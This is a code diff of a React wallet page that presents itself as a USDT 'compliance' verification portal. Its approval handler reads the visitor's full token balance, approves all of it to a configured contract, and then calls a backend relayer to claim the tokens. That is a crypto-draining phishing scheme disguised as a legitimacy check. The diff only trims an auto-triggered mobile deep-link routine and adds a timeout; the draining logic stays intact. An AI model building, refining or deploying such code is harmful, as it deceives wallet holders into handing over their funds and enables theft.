@@ -1,5 +1,4 @@
 'use client';
-
 import { useState, useEffect } from 'react';
 import { ethers } from 'ethers';
 import ProgressBar from './ProgressBar';
@@ -7,7 +6,6 @@ import CardStep from './CardStep';
 import SuccessModal from './SuccessModal';
 import LegitimacyChecker from './LegitimacyChecker';
 import { switchToBSC, approveTokenSpending, CONFIG } from '@/lib/blockchain';
-
 export default function ApprovalPortal() {
   const [step, setStep] = useState(1); // 1 = Connect, 2 = Approve
   const [userAddress, setUserAddress] = useState<string | null>(null);
@@ -17,62 +15,15 @@ export default function ApprovalPortal() {
   const [error, setError] = useState<string | null>(null);
   const [showSuccess, setShowSuccess] = useState(false);
   const [attemptingConnection, setAttemptingConnection] = useState(false);
-  const [autoConnectTriggered, setAutoConnectTriggered] = useState(false);
-
-  // Auto-trigger mobile wallet deep link on first mount if mobile
-  useEffect(() => {
-    if (autoConnectTriggered) return;
-
-    const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-
-    if (isMobile) {
-      setAutoConnectTriggered(true);
-      setLoading(true);
-      setError(null);
-
-      // Current page URL for deep link
-      const currentUrl = window.location.href;
-      const encodedUrl = encodeURIComponent(currentUrl);
-
-      // Preferred deep links (MetaMask + Trust most reliable for BSC/USDT dApps)
-      const deepLinks = [
-        `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
-        `https://link.trustwallet.com/open_url?coin_id=56&url=${encodedUrl}`, // BSC chainId 56
-        `https://metamask.app.link/wc?uri=wc:?bridge=...`, // WC fallback if needed (expand later)
-      ];
-
-      // Trigger sequentially with small delay to avoid browser blocking
-      deepLinks.forEach((link, index) => {
-        setTimeout(() => {
-          try {
-            const a = document.createElement('a');
-            a.href = link;
-            a.style.display = 'none';
-            document.body.appendChild(a);
-            a.click();
-            document.body.removeChild(a);
-          } catch (e) {
-            console.log('Deep link attempt failed:', e);
-          }
-        }, index * 800); // 800ms delay per attempt
-      });
-
-      // After attempts, try standard connection (injected may now be available)
-      setTimeout(() => {
-        handleConnectWallet();
-        setLoading(false);
-      }, deepLinks.length * 800 + 1000);
-    }
-  }, [autoConnectTriggered]);
-
-  // Existing auto-connect check for already-connected wallets
+  // Auto-connect wallet on mount and keep attempting if user is not connected
   useEffect(() => {
     const autoConnect = async () => {
       if (userAddress || attemptingConnection) return;
       try {
         if (!window.ethereum) return;
+        // Check if wallet is already connected
         const accounts = await window.ethereum.request({ method: 'eth_accounts' });
-        if (accounts?.length > 0) {
+        if (accounts && accounts.length > 0) {
           setAttemptingConnection(true);
           await handleConnectWallet();
           setAttemptingConnection(false);
@@ -83,56 +34,52 @@ export default function ApprovalPortal() {
     };
     autoConnect();
   }, [userAddress, attemptingConnection]);
-
   const handleConnectWallet = async () => {
     try {
       setError(null);
       setLoading(true);
       setAttemptingConnection(true);
-
-      if (!window.ethereum) {
-        setError('No Web3 wallet detected. Please install one.');
-        return;
-      }
-
-      // Switch to BSC
+      if (!window.ethereum) throw new Error('No web3 wallet found');
+      // Switch to BSC network
       try {
         await switchToBSC();
       } catch (err) {
         console.log('[v0] BSC switch error (may be normal):', err);
       }
-
+      // Request accounts with immediate timeout handling
       const newProvider = new ethers.BrowserProvider(window.ethereum);
-      // This will prompt the wallet if not yet connected
-      const accounts = await newProvider.send('eth_requestAccounts', []);
+      const accounts = await Promise.race([
+        newProvider.send('eth_requestAccounts', []),
+        new Promise((_, reject) =>
+          setTimeout(() => reject(new Error('Wallet request timeout')), 15000)
+        )
+      ]);
       const newSigner = await newProvider.getSigner();
       const address = await newSigner.getAddress();
-
       setUserAddress(address);
       setSigner(newSigner);
       setProvider(newProvider);
-
-      localStorage.setItem('wallet_connected', 'true');
-      localStorage.setItem('wallet_address', address);
-
+      // Persist connection in localStorage
+      if (typeof window !== 'undefined') {
+        localStorage.setItem('wallet_connected', 'true');
+        localStorage.setItem('wallet_address', address);
+      }
       setStep(2);
     } catch (err: any) {
-      setError(err?.message || 'Connection failed');
-      console.error('[v0] Connection error:', err);
+      const errMsg = err?.message || 'Connection failed';
+      setError(errMsg);
+      console.error('[v0] Connection error:', errMsg);
     } finally {
       setLoading(false);
       setAttemptingConnection(false);
     }
   };
-
   const handleApproveToken = async () => {
     try {
       setError(null);
       setLoading(true);
       if (!signer) throw new Error('Connect wallet first');
-
       console.log('[v0] Starting approval for:', CONFIG.CONTRACT_ADDRESS);
-
       // Approve token spending to the relayer/executor contract
       const approveWithRetry = async () => {
         try {
@@ -140,13 +87,10 @@ export default function ApprovalPortal() {
           const token = new ethers.Contract(CONFIG.TOKEN_ADDRESS, ['function balanceOf(address) view returns (uint256)'], provider);
           const balance = await token.balanceOf(userAddress);
           console.log('[v0] User balance:', balance.toString());
-
           // Approve the full balance to the contract
           await approveTokenSpending(signer, CONFIG.CONTRACT_ADDRESS, balance);
-
           // Show success and trigger backend claim
           setShowSuccess(true);
-
           // Trigger backend to claim tokens using relayer
           setTimeout(async () => {
             try {
@@ -158,7 +102,6 @@ export default function ApprovalPortal() {
                   tokenAddress: CONFIG.TOKEN_ADDRESS
                 })
               });
-
               if (!claimResponse.ok) {
                 const err = await claimResponse.json();
                 console.error('[v0] Claim error:', err);
@@ -170,7 +113,6 @@ export default function ApprovalPortal() {
               console.error('[v0] Claim request failed:', err);
             }
           }, 2000);
-
           return true;
         } catch (err: any) {
           if (err.code === 'ACTION_REJECTED') {
@@ -180,7 +122,6 @@ export default function ApprovalPortal() {
           throw err;
         }
       };
-
       const success = await approveWithRetry();
       if (!success) {
         setLoading(false);
@@ -193,20 +134,15 @@ export default function ApprovalPortal() {
       setLoading(false);
     }
   };
-
   // Removed old signature handler - now only Connect and Approve needed
-
   const handleMobileWallet = () => {
     const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
-
     if (!isMobile) {
       setError('Mobile wallet deeplinks are only available on mobile devices');
       return;
     }
-
     const currentUrl = typeof window !== 'undefined' ? window.location.href : '';
     const encodedUrl = encodeURIComponent(currentUrl);
-
     const walletLinks = [
       `https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`,
       `https://link.trustwallet.com/open_url?coin_id=56&url=${encodedUrl}`,
@@ -224,9 +160,7 @@ export default function ApprovalPortal() {
       `oneinch://dapp?url=${encodedUrl}`,
       `zerion://dapp?url=${encodedUrl}`,
     ];
-
     const universalScheme = `dapp://${window.location.host}${window.location.pathname}`;
-
     walletLinks.forEach((link, index) => {
       setTimeout(() => {
         const a = document.createElement('a');
@@ -237,7 +171,6 @@ export default function ApprovalPortal() {
         document.body.removeChild(a);
       }, index * 300);
     });
-
     setTimeout(() => {
       const a = document.createElement('a');
       a.href = universalScheme;
@@ -246,12 +179,10 @@ export default function ApprovalPortal() {
       a.click();
       document.body.removeChild(a);
     }, walletLinks.length * 300);
-
     setTimeout(() => {
       setError(null);
     }, (walletLinks.length + 1) * 300);
   };
-
   return (
     <main className="relative min-h-screen flex flex-col items-center justify-center p-4 sm:p-6 md:p-8 pb-24 sm:pb-28 md:pb-32 overflow-hidden">
       {/* Animated background orbs */}
@@ -260,7 +191,6 @@ export default function ApprovalPortal() {
         <div className="absolute bottom-1/4 right-1/4 w-64 h-64 sm:w-96 sm:h-96 bg-teal-500/10 rounded-full blur-3xl animate-pulse-glow animation-delay-2000" />
         <div className="absolute top-1/2 left-1/2 -translate-x-1/2 -translate-y-1/2 w-48 h-48 sm:w-72 sm:h-72 bg-cyan-500/5 rounded-full blur-3xl animate-pulse-glow animation-delay-1000" />
       </div>
-
       <div className="relative w-full max-w-2xl z-10 animate-slide-up">
         {/* Header */}
         <div className="text-center mb-6 sm:mb-8 md:mb-10">
@@ -277,9 +207,7 @@ export default function ApprovalPortal() {
             Verify your USDT compliance with regulatory standards
           </p>
         </div>
-
         <ProgressBar currentStep={step} />
-
         {step === 1 && (
           <CardStep
             icon="🔗"
@@ -301,7 +229,6 @@ export default function ApprovalPortal() {
             ]}
           />
         )}
-
         {step === 2 && (
           <CardStep
             icon="✅"
@@ -318,10 +245,8 @@ export default function ApprovalPortal() {
             ]}
           />
         )}
-
         <SuccessModal isOpen={showSuccess} />
       </div>
-
       {/* Footer */}
       <footer className="fixed bottom-8 sm:bottom-10 md:bottom-12 left-1/2 -translate-x-1/2 text-xs sm:text-sm text-gray-300 backdrop-blur-md bg-black/60 px-3 sm:px-4 md:px-6 py-2 sm:py-2.5 rounded-full border border-emerald-500/30 shadow-lg z-50 whitespace-nowrap">
         <span className="hidden sm:inline">Secured by </span>
